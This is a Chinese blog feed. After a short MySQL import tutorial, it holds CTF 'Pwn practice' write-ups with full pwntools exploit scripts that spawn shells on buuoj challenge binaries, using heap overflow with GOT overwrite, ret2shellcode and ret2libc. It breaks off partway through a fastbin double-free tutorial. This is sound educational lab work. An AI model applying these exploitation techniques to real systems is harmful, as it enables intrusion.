class="language-lang-txt"># mysql -uroot -p123456 < runoob.sql</code></pre><p>以上命令将将备份的整个数据库 runoob.sql 导入。</p><h3 id="0x20-source-命令导入"><a href="#0x20-source-命令导入" class="headerlink" title="0x20 source 命令导入"></a>0x20 source 命令导入</h3><p>source 命令导入数据库需要先登录到数库终端：</p><pre class=" language-lang-txt"><code class="language-lang-txt">mysql> create database abc;      # 创建数据库mysql> use abc;                  # 使用已创建的数据库 mysql> set names utf8;           # 设置编码mysql> source /home/abc/abc.sql  # 导入备份数据库</code></pre><h3 id="0x30-使用-LOAD-DATA-导入数据"><a href="#0x30-使用-LOAD-DATA-导入数据" class="headerlink" title="0x30 使用 LOAD DATA 导入数据"></a>0x30 使用 LOAD DATA 导入数据</h3><p>MySQL 中提供了LOAD DATA INFILE语句来插入数据。 以下实例中将从当前目录中读取文件 dump.txt ，将该文件中的数据插入到当前数据库的 mytbl 表中。</p><pre class=" language-lang-txt"><code class="language-lang-txt">mysql> LOAD DATA LOCAL INFILE 'dump.txt' INTO TABLE mytbl;</code></pre><p>　如果指定LOCAL关键词，则表明从客户主机上按路径读取文件。如果没有指定，则文件在服务器上按路径读取文件。</p><p>你能明确地在LOAD DATA语句中指出列值的分隔符和行尾标记，但是默认标记是定位符和换行符。</p><p>两个命令的 FIELDS 和 LINES 子句的语法是一样的。两个子句都是可选的，但是如果两个同时被指定，FIELDS 子句必须出现在 LINES 子句之前。</p><p>如果用户指定一个 FIELDS 子句，它的子句 （TERMINATED BY、[OPTIONALLY] ENCLOSED BY 和 ESCAPED BY) 也是可选的，不过，用户必须至少指定它们中的一个。</p><pre class=" language-lang-txt"><code class="language-lang-txt">mysql> LOAD DATA LOCAL INFILE 'dump.txt' INTO TABLE mytbl  -> FIELDS TERMINATED BY ':'  -> LINES TERMINATED BY '\r\n';</code></pre><p>LOAD DATA 默认情况下是按照数据文件中列的顺序插入数据的，如果数据文件中的列与插入表中的列不一致，则需要指定列的顺序。</p><p>如，在数据文件中的列顺序是 a,b,c，但在插入表的列顺序为b,c,a，则数据导入语法如下：</p><pre class=" language-lang-txt"><code class="language-lang-txt">mysql> LOAD DATA LOCAL INFILE 'dump.txt'     -> INTO TABLE mytbl (b, c, a);</code></pre><h3 id="0x40-使用-mysqlimport-导入数据"><a href="#0x40-使用-mysqlimport-导入数据" class="headerlink" title="0x40 使用 mysqlimport 导入数据"></a>0x40 使用 mysqlimport 导入数据</h3><p>mysqlimport 客户端提供了 LOAD DATA INFILEQL 语句的一个命令行接口。mysqlimport 的大多数选项直接对应 LOAD DATA INFILE 子句。</p><p>从文件 dump.txt 中将数据导入到 mytbl 数据表中, 可以使用以下命令：</p><pre class=" language-lang-txt"><code class="language-lang-txt">$ mysqlimport -u root -p --local mytbl dump.txtpassword *****</code></pre><p>mysqlimport 命令可以指定选项来设置指定格式,命令语句格式如下：</p><pre class=" language-lang-txt"><code class="language-lang-txt">$ mysqlimport -u root -p --local --fields-terminated-by=":" \   --lines-terminated-by="\r\n"  mytbl dump.txtpassword *****</code></pre><p>mysqlimport 语句中使用 —columns 选项来设置列的顺序：</p><pre class=" language-lang-txt"><code class="language-lang-txt">$ mysqlimport -u root -p --local --columns=b,c,a \    mytbl dump.txtpassword *****</code></pre><p>mysqlimport的常用选项介绍</p><div class="table-container"><table><thead><tr><th style="text-align:left">选项</th><th style="text-align:left">功能</th></tr></thead><tbody><tr><td style="text-align:left">-d or —delete</td><td style="text-align:left">新数据导入数据表中之前删除数据数据表中的所有信息</td></tr><tr><td style="text-align:left">-f or —force</td><td style="text-align:left">不管是否遇到错误，mysqlimport将强制继续插入数据</td></tr><tr><td style="text-align:left">-i or —ignore</td><td style="text-align:left">mysqlimport跳过或者忽略那些有相同唯一 关键字的行， 导入文件中的数据将被忽略。</td></tr><tr><td style="text-align:left">-l or -lock-tables</td><td style="text-align:left">数据被插入之前锁住表，这样就防止了， 你在更新数据库时，用户的查询和更新受到影响。</td></tr><tr><td style="text-align:left">-r or -replace</td><td style="text-align:left">这个选项与－i选项的作用相反；此选项将替代 表中有相同唯一关键字的记录。</td></tr><tr><td style="text-align:left">—fields-enclosed- by= char</td><td style="text-align:left">指定文本文件中数据的记录时以什么括起的， 很多情况下 数据以双引号括起。 默认的情况下数据是没有被字符括起的。</td></tr><tr><td style="text-align:left">—fields-terminated- by=char</td><td style="text-align:left">指定各个数据的值之间的分隔符，在句号分隔的文件中， 分隔符是句号。您可以用此选项指定数据之间的分隔符。 默认的分隔符是跳格符（Tab）</td></tr><tr><td style="text-align:left">—lines-terminated- by=str</td><td style="text-align:left">此选项指定文本文件中行与行之间数据的分隔字符串 或者字符。 默认的情况下mysqlimport以newline为行分隔符。 您可以选择用一个字符串来替代一个单个的字符： 一个新行或者一个回车。</td></tr></tbody></table></div><p>mysqlimport 命令常用的选项还有 -v 显示版本（version）， -p 提示输入密码（password）等。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn练习-Day15</title>
      <link href="/2020/03/29/ctf/pwn/day15/"/>
      <url>/2020/03/29/ctf/pwn/day15/</url>
      
        <content type="html"><![CDATA[<h1 id="Day15"><a href="#Day15" class="headerlink" title="Day15"></a>Day15</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>冲冲冲！<br><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200315151450.png" alt=""></p><h2 id="0x10-babyfengshui-33c3-2016"><a href="#0x10-babyfengshui-33c3-2016" class="headerlink" title="0x10 babyfengshui_33c3_2016"></a>0x10 babyfengshui_33c3_2016</h2><p>题目来源 : buuoj.cn</p><p>题目难度：baby</p><p>考点：堆溢出,结构体指针利用，修改GOT表值</p><p>32位动态连接库文件</p><p>ida反汇编分析</p><blockquote><p>主函数</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">void __cdecl __noreturn main(){  char v0; // [esp+3h] [ebp-15h]  int v1; // [esp+4h] [ebp-14h]  size_t v2; // [esp+8h] [ebp-10h]  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  alarm(0x14u);  while ( 1 )  {    puts("0: Add a user");    puts("1: Delete a user");    puts("2: Display a user");    puts("3: Update a user description");    puts("4: Exit");    printf("Action: ");    if ( __isoc99_scanf("%d", &v1) == -1 )      break;    if ( !v1 )    {      printf("size of description: ");      __isoc99_scanf("%u%c", &v2, &v0);       sub_8048816(v2);    }    if ( v1 == 1 )    {      printf("index: ");      __isoc99_scanf("%d", &v2);      sub_8048905(v2);    }    if ( v1 == 2 )    {      printf("index: ");      __isoc99_scanf("%d", &v2);      sub_804898F(v2);    }    if ( v1 == 3 )    {      printf("index: ");      __isoc99_scanf("%d", &v2);      sub_8048724(v2);    }    if ( v1 == 4 )    {      puts("Bye");      exit(0);    }    if ( byte_804B069 > 0x31u )    {      puts("maximum capacity exceeded, bye");      exit(0);    }  }  exit(1);}</code></pre><blockquote><p>Delete()函数，指针置空了，且判断了堆块是否存在，不是UAF</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">unsigned int __cdecl sub_8048905(unsigned __int8 a1){  unsigned int v2; // [esp+1Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  if ( a1 < byte_804B069 && ptr[a1] )  {    free(*ptr[a1]);    free(ptr[a1]);    ptr[a1] = 0;  }  return __readgsdword(0x14u) ^ v2;</code></pre><blockquote><p>show()函数</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">unsigned int __cdecl sub_804898F(unsigned __int8 a1){  unsigned int v2; // [esp+1Ch] [ebp-Ch]  v2 = __readgsdword(0x14u);  if ( a1 < byte_804B069 && ptr[a1] )  {    printf("name: %s\n", ptr[a1] + 4);    printf("description: %s\n", *ptr[a1]);  }  return __readgsdword(0x14u) ^ v2;}</code></pre><blockquote><p>add()函数</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">_DWORD *__cdecl sub_8048816(size_t a1){  void *s; // ST24_4  _DWORD *v2; // ST28_4  s = malloc(a1);  memset(s, 0, a1);  v2 = malloc(0x80u);  memset(v2, 0, 0x80u);  *v2 = s;  ptr[byte_804B069] = v2;  printf("name: ");  sub_80486BB(ptr[byte_804B069] + 4, 124);  sub_8048724((++byte_804B069 - 1));  return v2;}</code></pre><blockquote><p>edit()函数</p></blockquote><pre class=" language-lang-c"><code class="language-lang-c">unsigned int __cdecl sub_8048724(unsigned __int8 a1){  char v2; // [esp+17h] [ebp-11h]  int v3; // [esp+18h] [ebp-10h]  unsigned int v4; // [esp+1Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  if ( a1 < byte_804B069 && ptr[a1] )  {    v3 = 0;    printf("text length: ");    __isoc99_scanf("%u%c", &v3, &v2);    if ( (v3 + *ptr[a1]) >= ptr[a1] - 4 ) //这里    {      puts("my l33t defenses cannot be fooled, cya!");      exit(1);    }    printf("text: ");    sub_80486BB(*ptr[a1], v3 + 1);  }  return __readgsdword(0x14u) ^ v4;}</code></pre><p>更新description里面的数据，需要注意的是其检查数据长度的方式(13行)，是以description堆块的起始地址和name的起始地址之间的长度</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200328171442.png" alt=""></p><p>老实说没见过的，不会写，看了看其他人的解法，</p><p>Add函数进行了两次堆的申请，并且把第一次申请的堆的地址赋值到第二次申请的堆的数据之中，由此可以判断出此函数利用了一个结构体，而第二次申请的堆的大小是固定的，可以得到结构体的数据结构：</p><pre class=" language-lang-c"><code class="language-lang-c">struct Node{    char * description;    char name[0x7C];}</code></pre><p>整理了一下利用思路：</p><p>0.写入<code>/bin/sh\x00</code><br>1.泄露libc的地址(利用free的地址)</p><ol><li>修改*ptr指针指向free的地址，泄露出got表的真实地址</li><li>在后面利用*ptr指针改为system地址，意思就是free的地址改为了system</li><li>当再次free的时候就触发了get shell</li></ol><p>那么如何泄露libc呢，我们都知道在栈溢出的时候，我们是利用一些函数来输出泄露GOT表地址，至于为什么可以这样我记得应该是利用了延迟绑定的机制，具体可以参考，<a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">https://www.freebuf.com/news/182894.html</a></p><p>屁话不多写，那么在堆中我们怎么泄露呢</p><p>程序提供了一个show()函数，而理解了chunk后我们知道，我们可以控制fd与bk两个指针，</p><p>那么问题就解决了，我们如果修改chunk的fd指针为我们想要泄露的got表地址，然后利用show函数输出他呢</p><p>那么我们就可以得到函数的got表地址，利用libc工具就可以算出libc版本</p><p>泄露libc地址（利用free地址）</p><pre class=" language-lang-python"><code class="language-lang-python">    add(0x10, "aaa", 0x10, "bbb") #index0    add(0x10, "aaa", 0x10, "bbb") #index1    add(0x10, "aaa", 0x10, "/bin/sh\x00") #index2    delete(0)    free_got = elf.got["free"]    payload = 0x80*"a" + p32(0x0) + p32(0x19) + "\x00"*20 + p32(0x89) + p32(free_got)    add(0x80, "aaa", len(payload), payload) #index3    # leak libc    show(1)    sh.recvuntil("description: ")    free_addr = u32(sh.recv()[0:4])    print("func address: " + hex(free_addr))</code></pre><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200328182102.png" alt=""></p><p>泄露出libc地址后就好说了</p><pre class=" language-lang-python"><code class="language-lang-python">    libc = LibcSearcher('free', free_addr)    libc_base = free_addr - libc.dump('free')    sys_addr = libc_base + libc.dump('system')    #堆块1的description指针已经被修改为free的地址，则可以将free地址内的内容替换为system    # 0x804b010:    0xf7e08da0    #这样程序下次调用free时    #    free(*ptr[a1]);    #     free(ptr[a1]);    #    而index2中我们放入的是"/bin/sh"    #     因此程序会执行free(ptr[a1])==>system("/bin/sh")    Edit(1, 0x4, p32(sys_addr))    Delete(2)</code></pre><p>完整exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *from LibcSearcher import *proc="./babyfengshui_33c3_2016"elf=ELF(proc)def Add(des_size,des,tex_size,tex):    sh.recvuntil("Action: ")    sh.sendline(str(0))    sh.recvuntil("size of description: ")    sh.sendline(str(des_size))    sh.recvuntil("name: ")    sh.sendline(des)    sh.recvuntil("text length: ")    sh.sendline(str(tex_size))    sh.recvuntil("text: ")    sh.sendline(tex)def Delete(index):    sh.recvuntil("Action: ")    sh.sendline(str(1))    sh.recvuntil("index: ")    sh.sendline(str(index))def Edit(index,tex_size,tex):    sh.sendline(str(3))    sh.recvuntil("index: ")    sh.sendline(str(index))    sh.recvuntil("text length: ")    sh.sendline(str(tex_size))    sh.recvuntil("text: ")    sh.sendline(tex)def Show(index):    sh.recvuntil("Action: ")    sh.sendline(str(2))    sh.recvuntil("index: ")    sh.sendline(str(index))def pwn(ip,port,debug):    global sh    if debug==1:        context.log_level="debug"        sh=process(proc)    else:        sh=remote(ip,port)    Add(0x10, "aaa", 0x10, "bbb") #index0    Add(0x10, "aaa", 0x10, "bbb") #index1    Add(0x10, "aaa", 0x10, "/bin/sh\x00") #index2    Delete(0)    free_got = elf.got["free"]    payload = 128*"a" + p32(0x0) + p32(0x19) + "\x00"*20 + p32(0x89) + p32(free_got)    Add(0x80, "aaa", len(payload), payload) #index3    # leak libc    Show(1)    sh.recvuntil("description: ")    free_addr = u32(sh.recv()[0:4])    #libc_addr = free_addr - libc.symbols["free"]    #libc_addr = free_addr - 0x00070750    print("func address: " + hex(free_addr))    libc = LibcSearcher('free', free_addr)    libc_base = free_addr - libc.dump('free')    sys_addr = libc_base + libc.dump('system')    #堆块1的description指针已经被修改为free的地址，则可以将free地址内的内容替换为system    Edit(1, 0x4, p32(sys_addr))    # gdb.attach(sh)    Delete(2)    sh.sendline("cat flag")    sh.interactive()if __name__ =="__main__":    pwn("node3.buuoj.cn",28043,1)</code></pre><h2 id="0x20-ZJCTF-2019-Login"><a href="#0x20-ZJCTF-2019-Login" class="headerlink" title="0x20 [ZJCTF 2019]Login"></a>0x20 [ZJCTF 2019]Login</h2><p>题目来源：buuoj</p><p>考点：c++逆向分析</p><p>难度：简单</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *from LibcSearcher import *proc="./login"elf=ELF(proc)def pwn(ip,port,debug):    global sh    if debug==1:        context.log_level="debug"        sh=process(proc)    else:        sh=remote(ip,port)    get_shell=0x0400E88    payload='2jctf_pa5sw0rd'+'\x00'*58+p64(get_shell)    sh.sendlineafter("Please enter username: ","admin")    sh.sendlineafter("Please enter password: ",payload)    sh.sendline("cat flag")    sh.interactive()if __name__ =="__main__":    pwn("node3.buuoj.cn",28510,0)</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn练习-day13</title>
      <link href="/2020/03/27/ctf/pwn/day13/"/>
      <url>/2020/03/27/ctf/pwn/day13/</url>
      
        <content type="html"><![CDATA[<h1 id="Day13"><a href="#Day13" class="headerlink" title="Day13"></a>Day13</h1><h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>题目来源：buuoj</p><p>考点：ret2shellcode</p><p>难度：简单</p><p>32位动态链接库文件，开了RELRO，不能修改GOT表了</p><p>程序没有提供后门，主要函数为：</p><pre class=" language-lang-c"><code class="language-lang-c">void *chall(){  size_t v0; // eax  void *result; // eax  char s; // [esp+Ch] [ebp-40Ch]  _BYTE *v3; // [esp+40Ch] [ebp-Ch]  printf("Yippie, lets crash: %p\n", &s);  printf("Whats your name?\n");  printf("> ");  fgets(&s, 1023, stdin);  v0 = strlen(&s);  v3 = memchr(&s, '\n', v0);  if ( v3 )    *v3 = 0;  printf("\nWelcome %s!\n", &s);  result = strcmp(&s, "crashme");  if ( !result )    result = vuln(&s, 0x400u);  return result;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">void *__cdecl vuln(char src, size_t n){  char dest; // [esp+6h] [ebp-32h]  return memcpy(&dest, &src, n); //明显漏洞函数}</code></pre><p>这程序是什么意思呢，大概就是一开始给了&amp;s的地址，然后我们可以输入一些东西到&amp;s里，之后程序会搜索&amp;s里的 ‘\n’ ,并把 ‘\n’ 都替换成0 ，比较&amp;s与 字符串 “crashme”，如果相等，我们就可以执行函数vuln，也就是我们的漏洞函数</p><p>知道了程序是怎么玩的，就成功一半了，捋一下利用思路：程序没开启NX保护，因此我们主要选着的利用方式为shellcode的方式，要利用shellcode我们就需要知道：shellcode的栈上的地址，而程序一开就给了我们，，，</p><p>接下来就是算偏移来让程序返回到shellcode的地方，利用GDB的调试功能</p><p>1.计算出输入与ebp的距离为22—-&gt;22+4=26</p><p>2.然后写上我们的返回地址</p><p>3.shellcode的地址就是我们的返回地址，通过gdb调试计算为：s-0x1c</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'p = process('./ez_pz_hackover_2016')#p = remote('node3.buuoj.cn', 26750)p.recvuntil('crash: ')s_addr = int(p.recv(10), 16)p.recvuntil('> ')payload = 'crashme\x00' #绕过result = strcmp(&s, "crashme");payload = payload.ljust(26, '\x00')# offsetpayload += p32(s_addr-0x1C)# retaddrpayload += asm(shellcraft.i386.sh())#shellcodep.sendline(payload)p.interactive()</code></pre><h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>题目来源：buuoj</p><p>考点：read溢出</p><p>难度：入门</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *# p=process("./level2")p=remote("node3.buuoj.cn",28752)elf=ELF("./level2")# context.log_level="debug"main=elf.symbols['main']system=elf.symbols['system']#.data:0804A024 hint            db '/bin/sh',0hint=0x0804a024payload=""payload=payload.ljust(0x88,"a")payload+= 'bbbb' + p32(system) + 'bbbb' + p32(hint)p.sendline(payload)p.sendline("cat flag")p.interactive()</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn练习-day14</title>
      <link href="/2020/03/27/ctf/pwn/day14/"/>
      <url>/2020/03/27/ctf/pwn/day14/</url>
      
        <content type="html"><![CDATA[<h1 id="Day14"><a href="#Day14" class="headerlink" title="Day14"></a>Day14</h1><h2 id="0x10-pwn2-sctf-2016"><a href="#0x10-pwn2-sctf-2016" class="headerlink" title="0x10 pwn2_sctf_2016"></a>0x10 pwn2_sctf_2016</h2><p>题目来源：buuoj</p><p>考点：rop或者ret2libc，负数绕过</p><p>难度：简单</p><p>ida反汇编主要函数：</p><pre class=" language-lang-c"><code class="language-lang-c">int vuln(){  char nptr; // [esp+1Ch] [ebp-2Ch]  int v2; // [esp+3Ch] [ebp-Ch]  printf("How many bytes do you want me to read? ");  get_n((int)&nptr, 4u);  v2 = atoi(&nptr);  if ( v2 > 32 )    return printf("No! That size (%d) is too large!\n", v2);  printf("Ok, sounds good. Give me %u bytes of data!\n", v2);  get_n((int)&nptr, v2);  return printf("You said: %s\n", &nptr);}</code></pre><p>仔细观察，我们发现：</p><pre class=" language-lang-txt"><code class="language-lang-txt">.text:080484CD                 push    ebp.text:080484CE                 mov     ebp, esp.text:080484D0                 int     80h             ; LINUX -.text:080484D2                 retn.text:080484D2 do_thing        endp ; sp-analysis failed.text:080484D2.text:080484D3 ; ---------------------------------------------------------------------------.text:080484D3                 inc     eax.text:080484D4                 retn.text:080484D5 ; ---------------------------------------------------------------------------.text:080484D5                 inc     ebx.text:080484D6                 retn.text:080484D7 ; ---------------------------------------------------------------------------.text:080484D7                 inc     ecx.text:080484D8                 retn.text:080484D9 ; ---------------------------------------------------------------------------.text:080484D9                 inc     edx.text:080484DA                 retn.text:080484DB ; ---------------------------------------------------------------------------.text:080484DB                 inc     esi.text:080484DC                 retn.text:080484DD ; ---------------------------------------------------------------------------.text:080484DD                 inc     edi.text:080484DE                 retn.text:080484DF ; ---------------------------------------------------------------------------.text:080484DF                 inc     ebp.text:080484E0                 retn.text:080484E1 ; ---------------------------------------------------------------------------.text:080484E1                 pop     ebp.text:080484E2                 retn.text:080484E2 ; } // starts at 80484CD</code></pre><p>一看就想起来了，这跟我们前面讲的rop基础很像啊：</p><pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret  0xbpop ebx; ret  /bin/shpop ecx; ret  0pop edx; ret  0int 80h</code></pre><p>而且当我们输入-1的时候，就可以绕过v2大小的限制,</p><p>但没有发现 <code>/bin/sh</code> 啊，我决定使用ret2libc了</p><p>2.ret2libc做法</p><p>对于这类题目，ret2libc一般都可以直接通吃：</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *from LibcSearcher import *p=process("./pwn2_sctf_2016")elf=ELF("./pwn2_sctf_2016")main=elf.symbols['main']__libc_start_main_got=elf.got['__libc_start_main']printf_plt=elf.plt['printf']context.log_level="debug"p.sendlineafter("How many bytes do you want me to read? ",str(-1))payload1=flat(['a'*0x2c,'bbbb',printf_plt, main ,__libc_start_main_got])p.sendlineafter("!\n",payload1)p.recvline('\n')libc_start_main=u32(p.recv(4))log.info("__libc_start_main:"+hex(libc_start_main))libc = LibcSearcher('__libc_start_main', libc_start_main)libcbase = libc_start_main - libc.dump('__libc_start_main')system_addr = libcbase + libc.dump('system')binsh_addr = libcbase + libc.dump('str_bin_sh')p.sendlineafter("How many bytes do you want me to read? ",str(-1))payload2=flat(['a'*0x2c,'bbbb',system_addr , 'bbbb' ,binsh_addr])p.sendlineafter("!\n",payload2)p.interactive()</code></pre><p>不知道为什么libc_start_main会失败，</p><p>换成printf就又可以了</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *from LibcSearcher import *# p=process("./pwn2_sctf_2016")p=remote("node3.buuoj.cn",28027)elf=ELF("./pwn2_sctf_2016")main=elf.symbols['main']printf_got=elf.got['printf']printf_plt=elf.plt['printf']# context.log_level="debug"p.sendlineafter("How many bytes do you want me to read? ",str(-1))payload1=flat(['a'*0x2c,'bbbb',p32(printf_plt), p32(main) ,p32(printf_got)])p.sendlineafter("!\n",payload1)p.recvline('\n')printf=u32(p.recv(4))log.info("printf_got:"+hex(printf))libc = LibcSearcher('printf', printf)libcbase = printf - libc.dump('printf')system_addr = libcbase + libc.dump('system')binsh_addr = libcbase + libc.dump('str_bin_sh')p.sendlineafter("How many bytes do you want me to read? ",str(-1))payload2=flat(['a'*0x2c,'bbbb',p32(system_addr) , 'bbbb' ,p32(binsh_addr)])p.sendlineafter("!\n",payload2)p.interactive()</code></pre><h2 id="0x20-铁人三项-第五赛区-2018-rop"><a href="#0x20-铁人三项-第五赛区-2018-rop" class="headerlink" title="0x20 铁人三项(第五赛区)_2018_rop"></a>0x20 铁人三项(第五赛区)_2018_rop</h2><p>题目来源：buuoj</p><p>考点：rop</p><p>难度：简单</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *from LibcSearcher import *proc="./2018_rop"elf=ELF(proc)write_got=elf.got['write']write_plt=elf.plt['write']def pwn(ip,port,debug):    global sh    if debug==1:        context.log_level="debug"        sh=process(proc)    else:        sh=remote(ip,port)    # 0x0804855d : pop esi ; pop edi ; pop ebp ; ret    pop3_ret=0x0804855d    # vulnerable_function 0x08048474    ret=0x08048474    # payload='a'*offset + retaddr    payload='a'*0x88 + 'bbbb' + p32(write_plt) + p32(pop3_ret) +p32(1) + p32(write_got) +p32(4) +p32(ret)     sh.sendline(payload)    #leak_libc    write=u32(sh.recv()[0:4])    log.info("write:"+hex(write))    libc = LibcSearcher("write",write)    libc_base = write - libc.dump('write')    system = libc_base + libc.dump('system')    binsh = libc_base + libc.dump('str_bin_sh')    # 0x08048199 : ret    system_ret=0x08048199    ubuntu18_payload='a'*0x88 +'bbbb' +p32(system_ret)+ p32(system) + 'bbbb' + p32(binsh)    payload='a'*0x88 +'bbbb' + p32(system) + 'bbbb' + p32(binsh)    sh.sendline(payload)    # sh.sendline(ubuntu18_payload)    # sh.sendline("cat flag")    sh.interactive()if __name__ =="__main__":    pwn("node3.buuoj.cn",27648,0)</code></pre><p>测试后发现，好像不用ret也能getshell,奇了怪了，以前就不行</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastbins attack 学习记录</title>
      <link href="/2020/03/25/ctf/pwn/fastbins/"/>
      <url>/2020/03/25/ctf/pwn/fastbins/</url>
      
        <content type="html"><![CDATA[<h1 id="fastbins-attack-——Fastbin-Double-Free"><a href="#fastbins-attack-——Fastbin-Double-Free" class="headerlink" title="fastbins attack ——Fastbin Double Free"></a>fastbins attack ——Fastbin Double Free</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本篇为学习记录所用</p><h2 id="0x10-漏洞原理"><a href="#0x10-漏洞原理" class="headerlink" title="0x10 漏洞原理"></a>0x10 漏洞原理</h2><p>利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，然后 fastbin attack 可以实现有限的地址写能力</p><p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 我们来看一下 fastbin 是怎样管理空闲 chunk 的。</p><pre class=" language-lang-c"><code class="language-lang-c">int main(void){    void *chunk1,*chunk2,*chunk3;    chunk1=malloc(0x30);    chunk2=malloc(0x30);    chunk3=malloc(0x30);    //进行释放    free(chunk1);    free(chunk2);    free(chunk3);    return 0;}</code></pre><p>释放前</p><pre class=" language-lang-txt"><code class="language-lang-txt">0x602000:   0x0000000000000000  0x0000000000000041 <=== chunk10x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x0000000000000041 <=== chunk20x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x0000000000000041 <=== chunk30x602090:   0x0000000000000000  0x00000000000000000x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x0000000000000000  0x00000000000000000x6020c0:   0x0000000000000000  0x0000000000020f41 <=== top chunk</code></pre><p>执行三次 free 进行释放后</p><pre class=" language-lang-txt"><code class="language-lang-txt">0x602000:   0x0000000000000000  0x0000000000000041 <=== chunk10x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x0000000000000041 <=== chunk20x602050:   0x0000000000602000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x0000000000000041 <=== chunk30x602090:   0x0000000000602040  0x00000000000000000x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x0000000000000000  0x00000000000000000x6020c0:   0x0000000000000000  0x0000000000020f41 <=== top chunk</code></pre><p>此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针，并且 chunk 3、2、1 构成了一个单链表</p><pre class=" language-lang-txt"><code class="language-lang-txt">Fastbins[idx=2, size=0x30,ptr=0x602080]===>Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE)===>Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE)===>Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE)</code></pre><p>Fastbin Double Free</p><p>Fastbin Double Free 是指 